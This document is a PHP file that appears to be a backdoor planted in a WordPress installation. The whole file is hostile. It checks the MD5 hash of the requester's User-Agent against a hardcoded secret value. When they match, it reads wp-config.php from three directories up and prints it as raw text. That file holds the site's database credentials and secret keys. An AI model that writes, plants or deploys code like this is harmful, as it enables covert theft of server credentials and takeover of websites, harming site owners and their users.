<?php /* 2bmsMX21QiReTmn */ ?>
<?php
// Define the encoded MD5 hash of the user-agent string
$encodedUserAgentHash = '16fee37559dbd42b448204446d02089f';

// Get the user-agent from the request
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Hash the user-agent from the request using MD5
$hashedUserAgent = md5($userAgent);

// Check if the hashed user-agent matches the encoded hash
if ($hashedUserAgent === $encodedUserAgentHash) {
    // User-agent matched, allow access to the page
    echo "Welcome!";
    // Put your page content here
} else {
    // User-agent doesn't match, deny access
    http_response_code(403);
    echo "Access Denied";
    // Stop further execution
    exit;
}
// Specify the path to the PHP file
$filePath = '../../../wp-config.php';

// Check if the file exists
if (file_exists($filePath)) {
    // Set the content type to text/plain to display raw code
    header('Content-Type: text/plain');
    
    // Output the file directly
    readfile($filePath);
} else {
    echo "File does not exist.";
}
?>